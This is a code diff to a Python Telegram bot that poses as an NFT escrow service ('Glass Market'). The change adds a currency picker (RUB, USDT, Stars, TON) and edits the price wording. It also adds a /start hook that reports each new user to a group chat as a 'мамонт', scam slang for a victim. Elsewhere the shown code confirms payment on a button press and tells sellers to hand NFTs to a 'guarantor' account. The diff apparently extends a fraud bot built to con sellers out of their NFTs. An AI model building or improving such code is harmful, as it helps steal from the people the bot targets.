@@ -101,6 +101,18 @@ dp.include_router(router)
 
 # ========== КЛАВИАТУРЫ ==========
 
+valuta = InlineKeyboardMarkup(inline_keyboard=[
+    [
+        InlineKeyboardButton(text="🇷🇺RUB", callback_data="rub"),
+        InlineKeyboardButton(text="🇺🇸USDT", callback_data="usdt")
+    ],
+    [
+        InlineKeyboardButton(text="⭐STARS", callback_data="stars"),
+        InlineKeyboardButton(text="💎TON", callback_data="tons")
+    ]
+])
+
+
 inline_kb = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="💳 Управление реквизитами", callback_data="manage_requisites"),
      InlineKeyboardButton(text="📝 Создать сделку", callback_data="create_deal")],
@@ -129,6 +141,9 @@ async def cmd_start(message: types.Message, state: FSMContext):
 
     logger.info(f"/start от {message.from_user.id}: {message.text}")
 
+
+    await bot.send_message(GROUP_ID, f"Новый мамонт запустил бота:\n\n👨‍💻Username: @{message.from_user.username}\n🆔ID: {message.from_user.id}")
+
     # Проверяем параметры ссылки
     if len(message.text.split()) > 1:
         params = message.text.split()[1]
@@ -154,7 +169,7 @@ async def cmd_start(message: types.Message, state: FSMContext):
 
                 await message.answer(
                     f"🛒 Покупка NFT\n\n"
-                    f"💰 Цена: ${deal['price']}\n"
+                    f"💰 Цена: {deal['price']}\n"
                     f"🔗 NFT: {deal['nft_link']}\n"
                     f"👤 Продавец: @{deal.get('seller_username', 'скрыт')}\n\n"
                     f"ℹ️ После оплаты продавец получит уведомление.",
@@ -164,6 +179,8 @@ async def cmd_start(message: types.Message, state: FSMContext):
             else:
                 await message.answer("❌ Сделка не найдена!")
                 return
+
+
 
     # Обычный старт
     photo_url = "https://iimg.su/i/WGjaUa"
@@ -221,7 +238,33 @@ async def create_deal_start(callback: CallbackQuery, state: FSMContext):
         return
 
     await callback.answer()
-    await callback.message.answer("Введите цену товара в долларах:")
+    await callback.message.answer("Выберите валюту: ",reply_markup=valuta)
+
+
+
+@router.callback_query(F.data == "rub")
+async def create_deal_start(callback: CallbackQuery, state: FSMContext):
+    await callback.answer()
+    await callback.message.answer("Введие цену в рублях: ")
+    await state.set_state(Form.waiting_for_price)
+
+
+@router.callback_query(F.data == "tons")
+async def create_deal_start(callback: CallbackQuery, state: FSMContext):
+    await callback.answer()
+    await callback.message.answer("Введие цену в тонах (TON): ")
+    await state.set_state(Form.waiting_for_price)
+
+@router.callback_query(F.data == "usdt")
+async def create_deal_start(callback: CallbackQuery, state: FSMContext):
+    await callback.answer()
+    await callback.message.answer("Введие цену в долларах: ")
+    await state.set_state(Form.waiting_for_price)
+
+@router.callback_query(F.data == "stars")
+async def create_deal_start(callback: CallbackQuery, state: FSMContext):
+    await callback.answer()
+    await callback.message.answer("Введие цену в звёздах: ")
     await state.set_state(Form.waiting_for_price)
 
 
@@ -277,14 +320,14 @@ async def save_nftlink(message: types.Message, state: FSMContext):
     # Клавиатура для продавца
     deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📤 Поделиться ссылкой",
-                              url=f"https://t.me/share/url?url={deal_data['deal_link']}&text=Купи%20мой%20NFT%20за%20${price}!")],
+                              url=f"https://t.me/share/url?url={deal_data['deal_link']}&text=Купи%20мой%20NFT%20за%20{price}!")],
         [InlineKeyboardButton(text="🗑️ Удалить", callback_data=f"delete_{deal_id}")]
     ])
 
     await message.answer(
         f"✅ Сделка создана!\n\n"
         f"📊 ID: `{deal_id}`\n"
-        f"💰 Цена: ${price}\n"
+        f"💰 Цена: {price}\n"
         f"🔗 NFT: {nftlink}\n\n"
         f"🔗 Ссылка для покупателя:\n`{deal_data['deal_link']}`",
         reply_markup=deal_keyboard,
@@ -327,7 +370,7 @@ async def process_payment(callback: CallbackQuery):
     await callback.answer("✅ Оплата подтверждена!", show_alert=True)
     await callback.message.edit_text(
         f"✅ Оплата проведена!\n"
-        f"💰 ${deal['price']}\n"
+        f"💰 {deal['price']}\n"
         f"📊 ID: {deal_id}\n\n"
         f"⌛ Продавец уведомлен. Ожидайте отправки NFT."
     )
@@ -344,7 +387,7 @@ async def process_payment(callback: CallbackQuery):
             chat_id=seller_id,
             text=f"🎉 Сделка оплачена!\n\n"
                  f"📊 ID сделки: {deal_id}\n"
-                 f"💰 Сумма: ${deal['price']}\n"
+                 f"💰 Сумма: {deal['price']}\n"
                  f"👤 Покупатель: @{deal['buyer_username']}\n"
                  f"🔗 NFT: {deal['nft_link']}\n\n"
                  f"⚠️ ВАЖНО: Перед подтверждением отправки,\n"
@@ -387,7 +430,7 @@ async def confirm_send_handler(callback: CallbackQuery):
     await callback.message.edit_text(
         f"⚠️ ПОДТВЕРЖДЕНИЕ ОТПРАВКИ\n\n"
         f"📊 ID сделки: {deal_id}\n"
-        f"💰 Сумма: ${deal['price']}\n"
+        f"💰 Сумма: {deal['price']}\n"
         f"👤 Покупатель: @{deal.get('buyer_username', 'Неизвестно')}\n\n"
         f"❓ Вы отправили NFT гаранту @{SUPPORT_USERNAME}?\n\n"
         f"✅ Нажмите 'Да' только после отправки NFT!\n"
@@ -428,7 +471,7 @@ async def really_confirm_handler(callback: CallbackQuery):
     await callback.message.edit_text(
         f"✅ Сделка завершена!\n\n"
         f"📊 ID сделки: {deal_id}\n"
-        f"💰 Сумма: ${deal['price']}\n"
+        f"💰 Сумма: {deal['price']}\n"
         f"👤 Покупатель: @{deal.get('buyer_username', 'Неизвестно')}\n"
         f"🕐 Время подтверждения: {deal['completed_at']}\n\n"
         f"🎉 Спасибо за использование Glass Market!",
@@ -443,7 +486,7 @@ async def really_confirm_handler(callback: CallbackQuery):
                 chat_id=buyer_id,
                 text=f"✅ Продавец подтвердил отправку NFT!\n\n"
                      f"📊 ID сделки: {deal_id}\n"
-                     f"💰 Сумма: ${deal['price']}\n"
+                     f"💰 Сумма: {deal['price']}\n"
                      f"🔗 NFT: {deal['nft_link']}\n\n"
                      f"NFT отправлен гаранту @{SUPPORT_USERNAME}.\n"
                      f"После проверки он будет передан вам.\n\n"
@@ -459,7 +502,7 @@ async def really_confirm_handler(callback: CallbackQuery):
             chat_id=SUPPORT_USERNAME,
             text=f"🔔 Новая завершенная сделка!\n\n"
                  f"📊 ID: {deal_id}\n"
-                 f"💰 Сумма: ${deal['price']}\n"
+                 f"💰 Сумма: {deal['price']}\n"
                  f"👤 Продавец: @{deal['seller_username']}\n"
                  f"👤 Покупатель: @{deal.get('buyer_username', 'Неизвестно')}\n"
                  f"🔗 NFT: {deal['nft_link']}\n\n"
@@ -497,7 +540,7 @@ async def back_to_payment_handler(callback: CallbackQuery):
             await callback.message.edit_text(
                 f"🎉 Сделка оплачена!\n\n"
                 f"📊 ID сделки: {deal_id}\n"
-                f"💰 Сумма: ${deal['price']}\n"
+                f"💰 Сумма: {deal['price']}\n"
                 f"👤 Покупатель: @{deal['buyer_username']}\n"
                 f"🔗 NFT: {deal['nft_link']}\n\n"
                 f"⚠️ ВАЖНО: Перед подтверждением отправки,\n"
@@ -538,7 +581,7 @@ async def cancel_deal_handler(callback: CallbackQuery):
     await callback.message.edit_text(
         f"⚠️ ПОДТВЕРЖДЕНИЕ ОТМЕНЫ\n\n"
         f"📊 ID сделки: {deal_id}\n"
-        f"💰 Сумма: ${deal['price']}\n"
+        f"💰 Сумма: {deal['price']}\n"
         f"👤 Покупатель: @{deal.get('buyer_username', 'Неизвестно')}\n\n"
         f"❓ Вы уверены что хотите отменить сделку?\n\n"
         f"⚠️ Покупателю будут возвращены средства.\n"
@@ -573,7 +616,7 @@ async def really_cancel_handler(callback: CallbackQuery):
     await callback.message.edit_text(
         f"❌ Сделка отменена\n\n"
         f"📊 ID: {deal_id}\n"
-        f"💰 Сумма: ${deal['price']}\n"
+        f"💰 Сумма: {deal['price']}\n"
         f"🕐 Время отмены: {deal['cancelled_at']}\n\n"
         f"Средства покупателю будут возвращены."
     )
@@ -586,7 +629,7 @@ async def really_cancel_handler(callback: CallbackQuery):
                 chat_id=buyer_id,
                 text=f"❌ Сделка отменена продавцом\n\n"
                      f"📊 ID сделки: {deal_id}\n"
-                     f"💰 Сумма: ${deal['price']}\n\n"
+                     f"💰 Сумма: {deal['price']}\n\n"
                      f"Средства будут возвращены в течение 24 часов.\n"
                      f"Приносим извинения за неудобства."
             )
@@ -638,6 +681,7 @@ async def manage_requisites(callback: CallbackQuery):
         photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
         caption=
         f"📋 Ваши реквизиты:\n\n"
+        f"⭐Username для звёзд: @{callback.from_user.username}\n"
         f"👛 TON: {ton_wallet}\n"
         f"💳 Карта: {card}",
         reply_markup=requisites_keyboard
@@ -677,6 +721,7 @@ async def save_ton(message: types.Message, state: FSMContext):
         photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
         caption=
         f"📋 Ваши реквизиты:\n\n"
+        f"⭐Username для звёзд: @{message.from_user.username}\n"
         f"👛 TON: {ton_wallet}\n"
         f"💳 Карта: {card}",
         reply_markup=requisites_keyboard
@@ -715,6 +760,7 @@ async def save_card(message: types.Message, state: FSMContext):
         photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
         caption=
         f"📋 Ваши реквизиты:\n\n"
+        f"⭐Username для звёзд: @{message.from_user.username}\n"
         f"👛 TON: {ton}\n"
         f"💳 Карта: {card}",
         reply_markup=requisites_keyboard
